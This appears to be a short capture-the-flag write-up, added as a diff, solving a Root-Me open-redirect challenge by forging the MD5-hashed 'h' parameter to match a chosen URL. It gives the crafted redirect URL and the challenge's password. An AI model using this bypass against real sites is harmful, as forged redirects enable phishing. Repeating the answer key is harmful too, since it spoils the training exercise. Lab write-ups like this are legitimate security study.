@@ -1,0 +1,13 @@
+View Page source ..
+You can see 3 urls , choose any one ..
+ " <a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a> "
+ you can 2 parameters first one is url , second is h ..
+ h is encrypt by Md5 , so ? , we will encrypt our payload ..
+ we will redirect to google ... 
+google in Md5 = 0a137b375cc3881a70e186ce2172c8d1
+we will change url and h :
+      http://challenge01.root-me.org/web-serveur/ch52/?url=www.google.com&h=0a137b375cc3881a70e186ce2172c8d1
+      
+      ------------------------------------------------------------------
+finaly password is : e6f8a530811d5a479812d7b82fc1a5c5
+view-source:http://challenge01.root-me.org/web-serveur/ch52/?url=www.google.com&h=0a137b375cc3881a70e186ce2172c8d1
